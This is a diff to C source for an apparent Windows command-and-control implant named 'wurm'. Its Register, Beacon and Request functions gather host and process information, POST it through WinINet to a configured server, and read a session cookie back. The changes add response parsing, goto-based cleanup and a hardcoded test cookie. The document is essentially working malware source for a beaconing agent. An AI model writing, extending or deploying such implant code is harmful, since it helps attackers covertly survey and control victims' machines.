@@ -72,7 +72,9 @@ void Package(CHAR* buffer) {
     }
 
     // Clean up memory
-    free(buffer);
+    goto cleanup;
+    cleanup:
+        free(buffer);
 }
 
 void Request() {
@@ -80,27 +82,32 @@ void Request() {
     HINTERNET hInternet; // Must be closed
     HINTERNET hConnect; // Must be closed
     HINTERNET hRequest; // Must be closed
+    CHAR* cookie = NULL;
+    CHAR* query_buffer = NULL;
+    DWORD read_buffer;
+    DWORD buffer_length = 0;
+    DWORD available_size = 0;  
     DWORD dw_error = GetLastError();
 
     // Set handle to initialize wininet functions
     hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet == NULL) {
         printf("Error: %lu\n", dw_error);
-        // exit(1);
+        goto cleanup;
     }
 
     // Set handle to connect to specified address and port
     hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
     if (hConnect == NULL) {
         printf("Error: %lu\n", dw_error);
-        // exit(1);
+        goto cleanup;
     }
 
     // Set handle to store a request to be sent
     hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
     if (hRequest == NULL) {
         printf("Error: %lu\n", dw_error);
-        // exit(1);
+        goto cleanup;
     }
 
     // Add request headers and send previously stored request handle
@@ -108,19 +115,53 @@ void Request() {
         HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD); // Set content-length header 
         if (HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size) == FALSE) {
             printf("Error: %lu\n", dw_error);
-            // exit(1);
-        } else {
-            printf("Response received");
+            goto cleanup;
         }
+
+        printf("Response received\n");
+
+        // Check the size of buffer the server wants to send
+        BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
+
+        if (available == FALSE || available_size == 0) {
+            printf("Error: %lu\n", dw_error);
+            goto cleanup;
+        }
+
+        // Allocate size of response to buffer
+        query_buffer = (CHAR*)realloc(query_buffer, available_size + 1);
+        memset(query_buffer, 0, available_size + 1);
+
+        // Write the response to buffer and store number of bytes written
+        BOOL value = InternetReadFile(hRequest, query_buffer, available_size, &read_buffer);
+
+        if (value == FALSE|| read_buffer == 0) {
+            printf("Error: %lu\n", dw_error);
+            goto cleanup;
+        }
+
+        // Store the buffer in a local cookie
+        buffer_length += read_buffer; // Add number of bytes read to length
+        cookie = (CHAR*) realloc(cookie, buffer_length + 1); // Allocate bytes to cookie
+        sprintf_s(cookie, buffer_length + 1, "%s\0", query_buffer); // Write buffer + null byte to allocated cookie
+
+        printf("Cookie: %s\n", cookie);
+
     } else {
         printf("Error: %lu\n", dw_error);
     }
 
     // Clean up memory and handles
-    free(wurm.data.buffer);
-    InternetCloseHandle(hInternet);
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hRequest);
+    goto cleanup;
+    cleanup:
+        free(wurm.data.buffer);
+        free(query_buffer);
+        free(cookie);
+        InternetCloseHandle(hInternet);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hRequest);
+        return;
+
 }
 
 void Register() {
@@ -209,9 +250,11 @@ void Register() {
     Request();
 
     // Clean up memory and handles
-    CloseHandle(snapshot);
-    free(data_pointer);
-    free(wurm.info.name); // Strdup requires variable to be freed
+    goto cleanup;
+    cleanup: 
+        CloseHandle(snapshot);
+        free(data_pointer);
+        free(wurm.info.name); // Strdup requires variable to be freed
 }
 
 void Beacon() {
@@ -229,6 +272,8 @@ void Beacon() {
     // Set data allocation format
     wurm.data.status = "beacon";
     wurm.data.format = "%s:%s";
+
+    wurm.auth.cookie = "bean";
 
     if (wurm.auth.cookie == NULL) {
         printf("Error: Cookie not set\n");
@@ -252,7 +297,9 @@ void Beacon() {
     Request();
 
     // Clean up memory
-    free(data_pointer);
+    goto cleanup;
+    cleanup:
+        free(data_pointer);
 }
 
 int main(int argc, char* argv[]) {
